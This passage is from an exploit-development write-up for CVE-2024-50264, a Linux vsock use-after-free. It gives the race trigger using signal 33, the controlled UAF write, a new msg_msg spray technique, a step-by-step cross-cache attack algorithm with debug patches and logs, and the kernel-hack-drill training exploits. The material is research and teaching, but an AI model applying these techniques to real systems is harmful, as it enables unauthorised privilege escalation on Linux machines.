    &lt;p&gt;To trigger the bug, the attacker should interrupt this &lt;code&gt;connect()&lt;/code&gt; system call with a POSIX signal. @v4bel &amp;amp; @qwerty used &lt;code&gt;SIGKILL&lt;/code&gt;, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:&lt;/p&gt;
    &lt;code&gt;struct sigevent sev = {};
timer_t race_timer = 0;

sev.sigev_notify = SIGEV_SIGNAL;
sev.sigev_signo = 33;
ret = timer_create(CLOCK_MONOTONIC, &amp;amp;sev, &amp;amp;race_timer);
&lt;/code&gt;
    &lt;p&gt;My fuzzer discovered that a timer can fire signal 33 and interrupt &lt;code&gt;connect()&lt;/code&gt;. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As &lt;code&gt;man 7 nptl&lt;/code&gt; explains:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33). One of these signals is used to support thread cancellation and POSIX timers (see&lt;/p&gt;&lt;code&gt;timer_create(2)&lt;/code&gt;); the other is used as part of a mechanism that ensures all threads in a process always have the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.&lt;/quote&gt;
    &lt;p&gt;True, these signals cannot be used in applications, but they are perfect for my exploit üòâ&lt;/p&gt;
    &lt;p&gt;I use &lt;code&gt;timer_settime()&lt;/code&gt; for &lt;code&gt;race_timer&lt;/code&gt;, which lets me choose the exact moment signal 33 interrupts &lt;code&gt;connect()&lt;/code&gt;. Moreover, the signal is invisible to the exploit process and doesn't kill it.&lt;/p&gt;
    &lt;head rend="h2"&gt;About memory corruption&lt;/head&gt;
    &lt;p&gt;The race condition succeeds when a signal interrupts the &lt;code&gt;connect()&lt;/code&gt; system call while the vulnerable socket is in the &lt;code&gt;TCP_ESTABLISHED&lt;/code&gt; state. The socket then drops into the &lt;code&gt;TCP_CLOSING&lt;/code&gt; state:&lt;/p&gt;
    &lt;code&gt;if (signal_pending(current)) {
	err = sock_intr_errno(timeout);
	sk-&amp;gt;sk_state = sk-&amp;gt;sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
	sock-&amp;gt;state = SS_UNCONNECTED;
	vsock_transport_cancel_pkt(vsk);
	vsock_remove_connected(vsk);
	goto out_wait;
}
&lt;/code&gt;
    &lt;p&gt;The second attempt to connect the vulnerable vsock to the server vsock using a different &lt;code&gt;svm_cid&lt;/code&gt; (&lt;code&gt;VMADDR_CID_HYPERVISOR&lt;/code&gt;) provokes memory corruption.&lt;/p&gt;
    &lt;code&gt;struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_HYPERVISOR
};

/* this connect will schedule the kernel worker performing UAF */
ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
    &lt;p&gt;Under the hood, the &lt;code&gt;connect()&lt;/code&gt; system call executes &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function switches the virtual socket to the new &lt;code&gt;svm_cid&lt;/code&gt; transport and frees the resources tied to the previous vsock transport:&lt;/p&gt;
    &lt;code&gt;if (vsk-&amp;gt;transport) {
	if (vsk-&amp;gt;transport == new_transport)
		return 0;

	/* transport-&amp;gt;release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */
	vsk-&amp;gt;transport-&amp;gt;release(vsk);
	vsock_deassign_transport(vsk);
}
&lt;/code&gt;
    &lt;p&gt;This procedure closes the old vsock transport in &lt;code&gt;virtio_transport_close()&lt;/code&gt; and frees the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. However, due to the erroneous &lt;code&gt;TCP_CLOSING&lt;/code&gt; state of the socket, &lt;code&gt;virtio_transport_close()&lt;/code&gt; initiates further communication. To handle that activity, the kernel schedules a &lt;code&gt;kworker&lt;/code&gt; that eventually calls &lt;code&gt;virtio_transport_space_update()&lt;/code&gt;, which operates on the freed structure:&lt;/p&gt;
    &lt;code&gt;static bool virtio_transport_space_update(struct sock *sk, struct sk_buff *skb)
{
	struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
	struct vsock_sock *vsk = vsock_sk(sk);
	struct virtio_vsock_sock *vvs = vsk-&amp;gt;trans; /* ptr to freed object */
	bool space_available;

	if (!vvs)
		return true;

	spin_lock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* proceed if 4 bytes are zero (UAF write non-zero to lock) */
	vvs-&amp;gt;peer_buf_alloc = le32_to_cpu(hdr-&amp;gt;buf_alloc); /* UAF write 4 bytes */
	vvs-&amp;gt;peer_fwd_cnt = le32_to_cpu(hdr-&amp;gt;fwd_cnt); /* UAF write 4 bytes */
	space_available = virtio_transport_has_space(vsk); /* UAF read, not interesting */
	spin_unlock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* UAF write, restore 4 zero bytes */
	return space_available;
}
&lt;/code&gt;
    &lt;p&gt;The following diagram shows the layout of the UAF in the vulnerable object:&lt;/p&gt;
    &lt;p&gt;Here in yellow I show the &lt;code&gt;tx_lock&lt;/code&gt; field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the &lt;code&gt;peer_buf_alloc&lt;/code&gt; and &lt;code&gt;peer_fwd_cnt&lt;/code&gt; fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.&lt;/p&gt;
    &lt;p&gt;The value written to &lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt; can be controlled from the userspace:&lt;/p&gt;
    &lt;code&gt;/* Increase the range for the value that we want to write during UAF: */
uaf_val_limit = 0x1lu; /* can't be zero */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));
uaf_val_limit = 0xfffffffflu;
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));

/* Set the 4-byte value that we want to write during UAF: */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
           &amp;amp;uaf_val, sizeof(uaf_val));
&lt;/code&gt;
    &lt;p&gt;The field &lt;code&gt;virtio_vsock_sock.peer_fwd_cnt&lt;/code&gt; tracks how many bytes have been pushed through vsock using &lt;code&gt;sendmsg()&lt;/code&gt;/&lt;code&gt;recvmsg()&lt;/code&gt;. It is zero by default (four zero bytes).&lt;/p&gt;
    &lt;head rend="h2"&gt;Not so fast. CVE-2024-50264 has limitations&lt;/head&gt;
    &lt;p&gt;As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;Reproducing this race condition is very unstable.&lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/item&gt;
      &lt;item&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero, as noted above.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I've ever seen. I guess that's why it received the Pwnie Award 2025 as the Best Privilege Escalation.&lt;/p&gt;
    &lt;head rend="h2"&gt;First thoughts on exploit strategy&lt;/head&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty was complex:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;A large-scale BPF JIT spray that filled a significant portion of physical memory&lt;/item&gt;
      &lt;item&gt;The SLUBStick technique from Graz University of Technology, which allowed to: &lt;list rend="ul"&gt;&lt;item&gt;Determine the number of objects in the active slab using a timing side channel&lt;/item&gt;&lt;item&gt;Then, place the client and server &lt;code&gt;virtio_vsock_sock&lt;/code&gt;objects in different slabs, landing one at the end of its slab and the other at the start of the next slab&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The Dirty Pagetable technique, which allowed to use the UAF object for overwriting a page table entry (PTE)&lt;/item&gt;
      &lt;item&gt;Modifying a PTE to make it possibly point to a BPF JIT region&lt;/item&gt;
      &lt;item&gt;Inserting a privilege-escalation payload into the BPF code&lt;/item&gt;
      &lt;item&gt;Communicating via a socket to execute the privilege-escalation payload.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.&lt;/p&gt;
    &lt;p&gt;I decided not to search victim objects inside the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. Ubuntu Server 24.04 ships with &lt;code&gt;kconfig&lt;/code&gt; options that neutralize naive heap spraying for UAF exploitation:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_SLAB_BUCKETS=y&lt;/code&gt;, which creates a set of separate slab caches for allocations with user-controlled data&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES=y&lt;/code&gt;. Here's a quote from the kernel documentation about it:&lt;p&gt;It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That's why I decided to perform the cross-cache attack anyway.&lt;/p&gt;
    &lt;p&gt;The first victim object I decided to try was &lt;code&gt;struct cred&lt;/code&gt;. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim &lt;code&gt;cred&lt;/code&gt;, because slabs for the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; have size 96 bytes (half of 192). The diagram below shows how two vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects overlap the &lt;code&gt;cred&lt;/code&gt; object. The memory corruption may happen on one of the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects.&lt;/p&gt;
    &lt;p&gt;Unfortunately, &lt;code&gt;struct cred&lt;/code&gt; reallocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects doesn't provide anything useful for the attacker:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If the UAF happened on the first &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the kernel would hang in&lt;code&gt;spin_lock_bh()&lt;/code&gt;, because&lt;code&gt;cred&lt;/code&gt;has a non-null&lt;code&gt;uid&lt;/code&gt;value at the place of&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;If the UAF happened on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, writing controlled data to&lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt;would corrupt the&lt;code&gt;cred.request_key_auth&lt;/code&gt;pointer. I had no idea how to use it without a prior infoleak.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;cred&lt;/code&gt; object didn't work for me, so I started to search for the next candidate. My next victim object for the memory corruption was &lt;code&gt;msg_msg&lt;/code&gt;. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article "Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel").&lt;/p&gt;
    &lt;p&gt;It was a novel approach back then. This time, I set out to create something new again.&lt;/p&gt;
    &lt;p&gt;I chose a 96-byte &lt;code&gt;msg_msg&lt;/code&gt; because the slab allocator would use slabs of the same size for this &lt;code&gt;msg_msg&lt;/code&gt; and &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. That would allow the UAF write to land at a fixed offset in the victim &lt;code&gt;msg_msg&lt;/code&gt; object. The following diagram shows what happens with the &lt;code&gt;msg_msg&lt;/code&gt; object allocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; is the kernelspace pointer to the previous object in the linked list. This pointer is zero when &lt;code&gt;msg_msg&lt;/code&gt; is created (see &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON&lt;/code&gt;) and then it is initialized with a non-null value when &lt;code&gt;msg_msg&lt;/code&gt; is inserted into the message queue. Unfortunately, this non-null pointer is interpreted as &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;. That makes the &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; function hang while executing &lt;code&gt;spin_lock_bh()&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To bypass this restriction, I needed the kernel to initialize &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; after the UAF write. I looked for a way to postpone placing &lt;code&gt;msg_msg&lt;/code&gt; in the message queue and eventually found the solution.&lt;/p&gt;
    &lt;head rend="h2"&gt;msg_msg spray allowing m_list field corruption (novel technique)&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I filled the message queue almost completely before sending the target &lt;code&gt;msg_msg&lt;/code&gt;.&lt;list rend="ul"&gt;&lt;item&gt;The message queue size is &lt;code&gt;MSGMNB=16384&lt;/code&gt;bytes.&lt;/item&gt;&lt;item&gt;I sent 2 clogging messages of 8191 bytes each without calling the &lt;code&gt;msgrcv()&lt;/code&gt;syscall.&lt;/item&gt;&lt;item&gt;Only 2 bytes were left in the queue.&lt;/item&gt;&lt;item&gt;I used &lt;code&gt;mtype = 1&lt;/code&gt;for these messages.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The message queue size is &lt;/item&gt;
      &lt;item&gt;Then I performed spraying by calling &lt;code&gt;msgsnd()&lt;/code&gt;for the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;list rend="ul"&gt;&lt;item&gt;I called the &lt;code&gt;msgsnd()&lt;/code&gt;syscall in separate pthreads and used&lt;code&gt;mtype = 2&lt;/code&gt;for these messages to distinguish them from the clogging messages.&lt;/item&gt;&lt;item&gt;The kernel allocates target &lt;code&gt;msg_msg&lt;/code&gt;and then blocks&lt;code&gt;msgsnd()&lt;/code&gt;in&lt;code&gt;ipc/msg.c&lt;/code&gt;while it waits for space in the message queue:&lt;/item&gt;&lt;/list&gt;&lt;code&gt;if (msg_fits_inqueue(msq, msgsz)) break; /* queue full, wait: */ if (msgflg &amp;amp; IPC_NOWAIT) { err = -EAGAIN; goto out_unlock0; } /* enqueue the sender and prepare to block */ ss_add(msq, &amp;amp;s, msgsz); if (!ipc_rcu_getref(&amp;amp;msq-&amp;gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ipc_unlock_object(&amp;amp;msq-&amp;gt;q_perm); rcu_read_unlock(); schedule();&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;I called the &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;While the&lt;/p&gt;&lt;code&gt;msgsnd()&lt;/code&gt;syscalls were waiting for space in the message queue, I performed the UAF write corrupting the&lt;code&gt;m_list&lt;/code&gt;,&lt;code&gt;m_type&lt;/code&gt;, and&lt;code&gt;m_ts&lt;/code&gt;fields of one of the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;After the UAF write, I called&lt;/p&gt;&lt;code&gt;msgrcv()&lt;/code&gt;for type 1 clogging messages.&lt;/item&gt;
      &lt;item&gt;Then the blocked &lt;code&gt;msgsnd()&lt;/code&gt;syscall woke up to add the sprayed&lt;code&gt;msg_msg&lt;/code&gt;to the queue and the kernel fixed the corrupted&lt;code&gt;m_list&lt;/code&gt;field:&lt;code&gt;if (!pipelined_send(msq, msg, &amp;amp;wake_q)) { /* no one is waiting for this message, enqueue it */ list_add_tail(&amp;amp;msg-&amp;gt;m_list, &amp;amp;msq-&amp;gt;q_messages); msq-&amp;gt;q_cbytes += msgsz; msq-&amp;gt;q_qnum++; percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_bytes, msgsz); percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_hdrs, 1); }&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cool! This technique is also useful for blind overwriting of &lt;code&gt;msg_msg&lt;/code&gt; using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted &lt;code&gt;m_list&lt;/code&gt; pointers. In my particular case, this approach allowed me to avoid &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; hanging in &lt;code&gt;spin_lock_bh()&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;To implement the UAF write into an &lt;code&gt;msg_msg&lt;/code&gt; object, I needed to perform cross-cache attack turning &lt;code&gt;virtio_vsock_sock&lt;/code&gt; into &lt;code&gt;msg_msg&lt;/code&gt;. On Ubuntu Server 24.04, the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects live in one of 16 &lt;code&gt;kmalloc-rnd-?-96&lt;/code&gt; slab caches enabled by &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt;. The &lt;code&gt;msg_msg&lt;/code&gt; objects live in a dedicated &lt;code&gt;msg_msg-96&lt;/code&gt; slab cache enabled by &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;If an unstable race condition creates problems, let's use a testing ground for developing the exploit primitives!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Kernel Hack Drill&lt;/head&gt;
    &lt;p&gt;Back in 2017, I created a pet project for my students called kernel-hack-drill. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use &lt;code&gt;kernel-hack-drill&lt;/code&gt; to develop the exploit primitives for CVE-2024-50264.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; is an open-source project published under the &lt;code&gt;GPL-3.0&lt;/code&gt; license. It contains the following parts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_mod.c&lt;/code&gt;is a small Linux kernel module that provides the&lt;code&gt;/proc/drill_act&lt;/code&gt;file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill.h&lt;/code&gt;is a header file describing the&lt;code&gt;drill_mod.ko&lt;/code&gt;interface:&lt;code&gt;enum drill_act_t { DRILL_ACT_NONE = 0, DRILL_ACT_ALLOC = 1, DRILL_ACT_CALLBACK = 2, DRILL_ACT_SAVE_VAL = 3, DRILL_ACT_FREE = 4, DRILL_ACT_RESET = 5 }; #define DRILL_ITEM_SIZE 95 struct drill_item_t { unsigned long foobar; void (*callback)(void); char data[]; /* C99 flexible array */ }; #define DRILL_N 10240&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_test.c&lt;/code&gt;is a userspace test for&lt;code&gt;drill_mod.ko&lt;/code&gt;that provides the examples of using&lt;code&gt;/proc/drill_act&lt;/code&gt;. This test doesn't provoke memory corruptions in&lt;code&gt;drill_mod.ko&lt;/code&gt;and it passes if&lt;code&gt;CONFIG_KASAN=y&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;README.md&lt;/code&gt;includes a detailed step-by-step setup guide on how to use&lt;code&gt;kernel-hack-drill&lt;/code&gt;(kudos to the contributors!).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Fun fact: when I chose the name &lt;code&gt;kernel-hack-drill&lt;/code&gt; for this project, I used the word &lt;code&gt;drill&lt;/code&gt; to mean &lt;code&gt;training&lt;/code&gt; or &lt;code&gt;workout&lt;/code&gt; for Linux kernel security. My friends and students read it differently. They thought I meant something like this:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;kernel-hack-drill&lt;/code&gt; project is a bit similar to KRWX, but much simpler. Moreover, it ships with ready-made PoC exploits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;: a UAF exploit that invokes a callback inside a freed&lt;code&gt;drill_item_t&lt;/code&gt;structure. It hijacks control flow and gains LPE.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It uses a cross-cache attack and overwrites&lt;code&gt;msg_msg.m_ts&lt;/code&gt;enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-cache attack and overwrites&lt;code&gt;pipe_buffer.flags&lt;/code&gt;to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Recent contributions added new variants (kudos to the contributors!):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback_rop_smep.c&lt;/code&gt;: an improved version of&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;that adds a ROP chain to bypass SMEP on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pte.c&lt;/code&gt;: a UAF exploit that writes to a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pud.c&lt;/code&gt;: an improved version of&lt;code&gt;__drill_uaf_w_pte.c__&lt;/code&gt;that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When I revisited &lt;code&gt;kernel-hack-drill&lt;/code&gt; during my CVE-2024-50264 work, this spare-time project hadn't seen an update in years. But now &lt;code&gt;kernel-hack-drill&lt;/code&gt; offers a solid set of resources that Linux kernel security researchers can explore.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with cross-cache attack using kernel-hack-drill&lt;/head&gt;
    &lt;p&gt;My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.&lt;/p&gt;
    &lt;p&gt;I implemented a standard cross-cache attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. You can see the full code in the repository, so I'll sketch the flow here. For background, I highly recommend Andrey Konovalov's talk SLUB Internals for Exploit Developers.&lt;/p&gt;
    &lt;p&gt;To plan the attack, I pulled the needed info from &lt;code&gt;/sys/kernel/slab&lt;/code&gt;. The slab caches that hold &lt;code&gt;virtio_vsock_sock&lt;/code&gt; (80 bytes) or &lt;code&gt;drill_item_t&lt;/code&gt; (95 bytes) each keep 120 slabs in per-CPU partial lists (&lt;code&gt;cpu_partial=120&lt;/code&gt;) and 42 objects in each slab (&lt;code&gt;objs_per_slab=42&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The cross-cache attack algorithm:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.&lt;/item&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab * cpu_partial&lt;/code&gt;objects. This creates the&lt;code&gt;cpu_partial&lt;/code&gt;number of full slabs that will later populate the partial list at step 6.&lt;/item&gt;
      &lt;item&gt;Create a slab that contains the UAF object. Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects and keep a dangling reference to the vulnerable object in that slab.&lt;/item&gt;
      &lt;item&gt;Create a new active slab again: allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects. This step is very important for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.&lt;/item&gt;
      &lt;item&gt;Completely free the slab that holds the UAF object. To do that, free &lt;code&gt;(objs_per_slab * 2 - 1)&lt;/code&gt;of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.&lt;/item&gt;
      &lt;item&gt;Fill up the partial list: free one of each &lt;code&gt;objs_per_slab&lt;/code&gt;objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.&lt;/item&gt;
      &lt;item&gt;Reclaim the page that contained the UAF object for another slab cache: spray the target &lt;code&gt;msg_msg&lt;/code&gt;objects. As a result, one&lt;code&gt;msg_msg&lt;/code&gt;is allocated where the vulnerable object (&lt;code&gt;drill_item_t&lt;/code&gt;in my case) used to be.&lt;/item&gt;
      &lt;item&gt;Exploit the UAF! Overwrite &lt;code&gt;msg_msg.m_ts&lt;/code&gt;to read kernel memory out of bounds.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I've seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I'll fill that gap.&lt;/p&gt;
    &lt;p&gt;Let's examine the attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. To watch it in action and debug it, make the following tweaks in your kernel sources:&lt;/p&gt;
    &lt;code&gt;diff --git a/mm/slub.c b/mm/slub.c
index be8b09e09d30..e45f055276d1 100644
--- a/mm/slub.c
+++ b/mm/slub.c
@@ -3180,6 +3180,7 @@ static void __put_partials(struct kmem_cache *s, struct slab *partial_slab)
        while (slab_to_discard) {
                slab = slab_to_discard;
                slab_to_discard = slab_to_discard-&amp;gt;next;
+               printk("__put_partials: cache 0x%lx slab 0x%lx\n", (unsigned long)s, (unsigned long)slab);
 
                stat(s, DEACTIVATE_EMPTY);
                discard_slab(s, slab);

diff --git a/ipc/msgutil.c b/ipc/msgutil.c
index c7be0c792647..21af92f531d6 100644
--- a/ipc/msgutil.c
+++ b/ipc/msgutil.c
@@ -64,6 +64,7 @@ static struct msg_msg *alloc_msg(size_t len)
        msg = kmem_buckets_alloc(msg_buckets, sizeof(*msg) + alen, GFP_KERNEL);
        if (msg == NULL)
                return NULL;
+       printk("msg_msg 0x%lx\n", (unsigned long)msg);
 
        msg-&amp;gt;next = NULL;
        msg-&amp;gt;security = NULL;
&lt;/code&gt;
    &lt;p&gt;In &lt;code&gt;__put_partials()&lt;/code&gt; I print the address of the slab that returns to the page allocator when &lt;code&gt;discard_slab()&lt;/code&gt; runs. In &lt;code&gt;alloc_msg()&lt;/code&gt; I print the kernel address of each newly allocated &lt;code&gt;msg_msg&lt;/code&gt; object.&lt;/p&gt;
    &lt;p&gt;When the cross-cache attack succeeds, the slab that held &lt;code&gt;drill_item_t&lt;/code&gt; objects is handed back to the page allocator and then reused for &lt;code&gt;msg_msg&lt;/code&gt; objects. Running the PoC exploit &lt;code&gt;drill_uaf_w_msg_msg&lt;/code&gt; makes this visible, as we observe:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In the kernel log: &lt;code&gt;[ 32.719582] drill: kmalloc'ed item 5123 (0xffff88800c960660, size 95)&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in stdout: &lt;code&gt;[+] done, current_n: 5124 (next for allocating) [!] obtain dangling reference from use-after-free bug [+] done, uaf_n: 5123&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in GDB (using with bata24/gef): &lt;code&gt;gef&amp;gt; slab-contains 0xffff88800c960660 [+] Wait for memory scan slab: 0xffffea0000325800 kmem_cache: 0xffff888003c45300 base: 0xffff88800c960000 name: kmalloc-rnd-05-96 size: 0x60 num_pages: 0x1&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Finally, in the kernel log: &lt;code&gt;[ 36.778165] drill: free item 5123 (0xffff88800c960660) ... [ 36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800 ... [ 36.892053] msg_msg 0xffff88800c960660&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We see the &lt;code&gt;drill_item_t&lt;/code&gt; object &lt;code&gt;0xffff88800c960660&lt;/code&gt; in slab &lt;code&gt;0xffffea0000325800&lt;/code&gt; reallocated as &lt;code&gt;msg_msg&lt;/code&gt;, which confirms that the cross-cache attack worked.&lt;/p&gt;
